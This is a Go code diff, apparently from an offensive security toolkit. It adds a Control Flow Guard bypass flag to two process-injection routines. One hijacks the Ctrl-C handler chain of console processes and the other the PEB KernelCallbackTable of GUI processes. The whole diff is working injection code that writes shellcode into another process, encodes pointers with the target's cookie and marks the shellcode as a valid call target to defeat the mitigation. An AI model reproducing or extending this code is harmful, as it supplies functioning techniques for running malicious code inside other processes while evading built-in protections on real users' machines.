@@ -13,7 +13,7 @@ import (
 )
 
 // executeOpusVariant1 implements Ctrl-C Handler Chain Injection
-func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
+func executeOpusVariant1(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
 	var sb strings.Builder
 	sb.WriteString("[*] Opus Injection Variant 1: Ctrl-C Handler Chain Injection\n")
 	sb.WriteString("[*] Target: Console processes only\n")
@@ -83,6 +83,15 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 	}
 	sb.WriteString(fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", shellcodeAddr))
 
+	// CFG bypass: mark shellcode as a valid indirect call target so the Ctrl-C dispatch succeeds.
+	if cfgBypass {
+		if cfgErr := cfgBypassApplyToTarget(hProcess, shellcodeAddr, len(shellcode)); cfgErr != nil {
+			sb.WriteString(fmt.Sprintf("[*] CFG bypass attempted but not required/available: %v\n", cfgErr))
+		} else {
+			sb.WriteString("[+] CFG bypass applied: shellcode marked as valid call target\n")
+		}
+	}
+
 	// Step 7: Encode shellcode address using the target's pointer cookie
 	encodedShellcodeAddr := encodePointer(shellcodeAddr, pointerCookie)
 	sb.WriteString(fmt.Sprintf("[+] Encoded shellcode address: 0x%X\n", encodedShellcodeAddr))
@@ -138,7 +147,7 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 }
 
 // executeOpusVariant4 implements PEB KernelCallbackTable Injection
-func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
+func executeOpusVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
 	var sb strings.Builder
 	sb.WriteString("[*] Opus Injection Variant 4: PEB KernelCallbackTable Injection\n")
 	sb.WriteString("[*] Target: GUI processes only (requires user32.dll)\n")
@@ -204,6 +213,15 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 		return sb.String(), fmt.Errorf("shellcode injection failed: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", shellcodeAddr))
+
+	// CFG bypass: mark shellcode as a valid indirect call target so KernelCallbackTable dispatch succeeds.
+	if cfgBypass {
+		if cfgErr := cfgBypassApplyToTarget(hProcess, shellcodeAddr, len(shellcode)); cfgErr != nil {
+			sb.WriteString(fmt.Sprintf("[*] CFG bypass attempted but not required/available: %v\n", cfgErr))
+		} else {
+			sb.WriteString("[+] CFG bypass applied: shellcode marked as valid call target\n")
+		}
+	}
 
 	// Step 6: Create modified callback table
 	modifiedTable := make([]byte, tableSize)
